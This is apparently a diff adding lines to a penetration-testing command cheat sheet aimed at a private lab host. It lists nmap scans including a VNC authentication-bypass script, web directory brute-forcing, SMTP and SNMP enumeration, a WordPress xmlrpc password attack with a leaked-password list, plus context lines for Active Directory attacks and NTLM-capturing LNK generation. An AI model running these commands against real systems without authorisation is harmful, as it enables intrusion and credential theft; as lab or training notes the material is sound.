@@ -65,3 +65,21 @@ crackmapexec smb 192.168.56.0/24 --local-auth -u '' -p ''
 privexchange.py -ah 192.168.56.1 -d BREAKING.BAD -u anonymous -p anonymous EXCHANGE.BREAKING.BAD
 neo4j console
 lnk-generate.py --host 192.168.56.1 --type ntlm --output '@SHUTDOWN-LNK.lnk'
+autorecon 192.168.10.10
+nmap --script=ldap-search -p 389 192.168.10.10
+nmap -sC -sV -T4 -p- -v 192.168.10.10
+nmap -p 5900 --script=realvnc-auth-bypass 192.168.10.10
+dirb http://192.168.10.10 /usr/share/seclists/Discovery/Web-Content/big.txt
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.10.10/
+gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.10.10/
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 20 -x php,txt,pl,sh,asp,aspx,html,json,py,cfm,rb,cgi -u http://192.168.10.10/
+smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 192.168.10.10
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 192.168.10.10
+smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 192.168.10.10
+onesixtyone 192.168.10.10 private
+onesixtyone 192.168.10.10 public
+onesixtyone 192.168.10.10 manager
+cewl http://192.168.10.10/ > dictionnary.txt
+wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --plugins-detection aggressive
+wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --enumerate u
+wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --plugins-version-detection passive --password-attack xmlrpc -U 'admin' -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt
